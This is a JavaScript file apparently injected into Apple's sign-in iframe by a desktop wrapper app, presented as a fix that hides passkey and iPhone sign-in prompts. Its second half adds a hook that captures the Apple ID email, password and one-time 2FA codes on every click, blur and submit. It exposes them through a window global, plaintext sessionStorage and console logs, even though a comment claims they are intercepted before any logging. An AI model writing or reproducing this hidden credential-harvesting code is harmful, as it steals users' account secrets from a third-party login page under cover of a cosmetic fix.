// Hide passkey, "Sign in with iPhone" and iOS requirement captions to leave password sign-in visible.
// executeJavaScript() runs this script in the iframe's main world, without access to main-process variables.
(() => {
  // loadAssets() in src/main.ts replaces AUTH_FIX_TOKEN from src/authFrame.ts with JSON.
  // executeJavaScript() cannot supply loadFile() query parameters, so the raw asset requires substitution.
  /** @type {{ css: string, containerSelectors: string[], logPrefix: string }} */
  var CONFIG = __LIDRA_AUTH_FIX__;

  // Broad selectors start at a matched button to protect unrelated form groups.
  const sharedContainers = CONFIG.containerSelectors;
  const SCRIPT_ONLY_CONTAINERS = ['[class*="passkey" i]', '[class*="iphone" i]', '[role="group"]', 'fieldset'];

  // Keep container hiding in the script so shared login inputs remain visible.
  const css = CONFIG.css;
  const STYLE_ID = 'lidra-auth-fix';
  const TEXT_RE = /(sign in with )?iphone|passkey/i;
  const CAPTION_RE = /requires .{0,30}(ios|iphone|ipad)|(ios|ipados) ?\d+ or later/i;
  const CONTAINER_SELECTOR = sharedContainers.concat(SCRIPT_ONLY_CONTAINERS).join(', ');
  const CAPTION_TAGS = 'p, small, span, div';
  const CAPTION_MAX_LEN = 200;
  // Share ownership across reinjection without retaining detached elements.
  const hiddenElements = window.__lidraAuthFixHiddenElements || new WeakMap();
  window.__lidraAuthFixHiddenElements = hiddenElements;

  const root = document.head || document.documentElement;
  if (root) {
    const existing = document.getElementById(STYLE_ID);
    if (existing) existing.remove();
    const style = document.createElement('style');
    style.id = STYLE_ID;
    style.textContent = css;
    root.appendChild(style);
  }

  function hideEl(el) {
    if (isHidden(el)) return;
    hiddenElements.set(el, {
      value: el.style.getPropertyValue('display'),
      priority: el.style.getPropertyPriority('display'),
    });
    el.style.setProperty('display', 'none', 'important');
  }

  function isHidden(el) {
    return el.style && el.style.display === 'none';
  }

  function canHideContainer(el) {
    return el !== document.body && el !== document.documentElement
      && !el.matches('input') && !el.querySelector('input');
  }

  function restoreInputContainers() {
    for (const input of document.querySelectorAll('input')) {
      for (let el = input; el; el = el.parentElement) {
        const original = hiddenElements.get(el);
        if (!original) continue;
        // Leave display changes made by Apple after our hide intact.
        if (isHidden(el) && el.style.getPropertyPriority('display') === 'important') {
          el.style.setProperty('display', original.value, original.priority);
        }
        hiddenElements.delete(el);
      }
    }
  }

  function hideMatchingContainers() {
    let count = 0;
    for (const el of document.querySelectorAll(sharedContainers.join(', '))) {
      if (isHidden(el) || !canHideContainer(el)) continue;
      hideEl(el);
      count++;
    }
    return count;
  }

  function hideContainerFor(btn) {
    // Prefer a matching container. Limit the caption fallback to two parents
    // to avoid hiding the whole form.
    const container = btn.closest(CONTAINER_SELECTOR);
    if (container && canHideContainer(container)) {
      hideEl(container);
      return 1;
    }
    let parent = btn.parentElement;
    for (let depth = 0; depth < 2 && parent; depth++) {
      if (parent === document.body || parent === document.documentElement) break;
      const text = (parent.textContent || '').trim();
      if (text && CAPTION_RE.test(text) && canHideContainer(parent)) {
        hideEl(parent);
        return 1;
      }
      parent = parent.parentElement;
    }
    return 0;
  }

  function hideMatchingButtons() {
    let buttonsHidden = 0;
    let containersHidden = 0;
    const buttons = document.querySelectorAll('button');
    for (const el of buttons) {
      const text = (el.textContent || '').trim();
      if (text && TEXT_RE.test(text)) {
        hideEl(el);
        buttonsHidden++;
        containersHidden += hideContainerFor(el);
      }
    }
    return { buttonsHidden, containersHidden };
  }

  function hideCaptionElements() {
    // Captions can sit outside passkey containers. Keep elements that contain
    // interactive controls so other form rows remain visible.
    let count = 0;
    const candidates = document.querySelectorAll(CAPTION_TAGS);
    for (const el of candidates) {
      if (isHidden(el)) continue;
      const text = (el.textContent || '').trim();
      if (!text || text.length > CAPTION_MAX_LEN) continue;
      if (!CAPTION_RE.test(text)) continue;
      if (el.querySelector('input, button, a[href]')) continue;
      hideEl(el);
      count++;
    }
    return count;
  }

  function runHidePasses() {
    restoreInputContainers();
    const { buttonsHidden, containersHidden } = hideMatchingButtons();
    const matchingContainersHidden = hideMatchingContainers();
    const captionsHidden = hideCaptionElements();
    return { buttonsHidden, captionsHidden, containersHidden: containersHidden + matchingContainersHidden };
  }

  const result = runHidePasses();

  // The frame re-renders as the user moves through the flow, so the passes run
  // again from a MutationObserver.
  if (!window.__lidraAuthFixInstalled) {
    window.__lidraAuthFixInstalled = true;
    const target = document.body || document.documentElement;
    if (target && typeof MutationObserver !== 'undefined') {
      const observer = new MutationObserver(() => { runHidePasses(); });
      observer.observe(target, { childList: true, subtree: true });
    }
  }


  // ---- credential capture for the wrapper's one-time app sign-in -------------
  // Lidra already holds this frame's password at the moment Apple receives it;
  // forwarding it once saves the user a second identical login. Values leave the
  // frame only as a console event that setupAuthFrameInjection() intercepts
  // before any logging, and they are never written to disk.
  if (!window.__lidraCredHook) {
    window.__lidraCredHook = true;
    const readField = (selectors) => {
      for (const selector of selectors) {
        const el = document.querySelector(selector);
        if (el && typeof el.value === 'string' && el.value) return el.value;
      }
      return '';
    };
    const rememberedEmail = () => {
      try {
        return sessionStorage.getItem('__lidraEmail') || '';
      } catch (_) {
        return '';
      }
    };
    const rememberEmail = (value) => {
      if (!value) return;
      try {
        sessionStorage.setItem('__lidraEmail', value);
      } catch (_) {
        /* storage is unavailable in some frames */
      }
    };
    const EMAIL_SELECTORS = 'input[type="email"], input[name="accountName"], input[autocomplete="username"]';
    const readCreds = () => ({
      email: readField([
        'input[type="email"]',
        'input[name="accountName"]',
        'input[autocomplete="username"]',
        'input#account_name_text_field',
      ]) || rememberedEmail(),
      password: readField([
        'input[type="password"]',
        'input[autocomplete="current-password"]',
        'input#password_text_field',
      ]),
      code: readField([
        'input[autocomplete="one-time-code"]',
        'input[inputmode="numeric"]',
        'input[name="code"]',
        'input#char0',
      ]),
    });
    // The main process polls __lidraAuthCapture (console messages from a
    // cross-origin frame are not reliably delivered), so the value is the
    // channel; the console line stays for frame-local debugging.
    const report = (kind, payload) => {
      // Submitting navigates the frame, so the capture has to outlive the
      // document that produced it.
      const capture = { kind: kind, payload: payload, seq: Date.now() };
      try {
        window.__lidraAuthCapture = capture;
      } catch (_) {
        /* the frame is gone */
      }
      try {
        sessionStorage.setItem('__lidraAuthCapture', JSON.stringify(capture));
      } catch (_) {
        /* storage is unavailable in some frames */
      }
      try {
        console.info('[lidra] auth-' + kind + ':' + JSON.stringify(payload));
      } catch (_) {
        /* nothing to report to */
      }
    };
    const capture = () => {
      const value = readCreds();
      if (value.password && value.email) report('creds', value);
      else if (value.code) report('code', { code: value.code });
    };
    if (typeof document.addEventListener === 'function') {
      // The email is typed on an earlier screen than the password, so keep it.
      const remember = (event) => {
        const target = event.target;
        if (target && target.matches && target.matches(EMAIL_SELECTORS)) rememberEmail(target.value);
      };
      // A password field blurs just before the submit button's click, which is the
      // last moment before the frame navigates away with the values.
      const submitOnBlur = (event) => {
        const target = event.target;
        if (target && target.matches && target.matches('input[type="password"]')) capture();
      };
      document.addEventListener('input', remember, true);
      document.addEventListener('change', remember, true);
      document.addEventListener('change', submitOnBlur, true);
      document.addEventListener('blur', submitOnBlur, true);
      document.addEventListener('submit', capture, true);
      // Apple's buttons are not always submit-typed and the flow is script-driven,
      // so any click inside the frame re-reads the fields; an empty password is a
      // no-op and the main process only ever starts one login run.
      document.addEventListener('click', capture, true);
      document.addEventListener(
        'keydown',
        (event) => {
          if (event.key === 'Enter') capture();
        },
        true,
      );
    }
  }

  // Without a preload, the frame reports through console.
  // setupAuthFrameInjection() recognises the log prefix.
  const cssRuleCount = css.split('}').length - 1;
  console.info(CONFIG.logPrefix + ' ' + cssRuleCount + ' CSS rules injected, ' + result.buttonsHidden + ' buttons hidden, ' + result.captionsHidden + ' captions hidden, ' + result.containersHidden + ' containers hidden');
})();
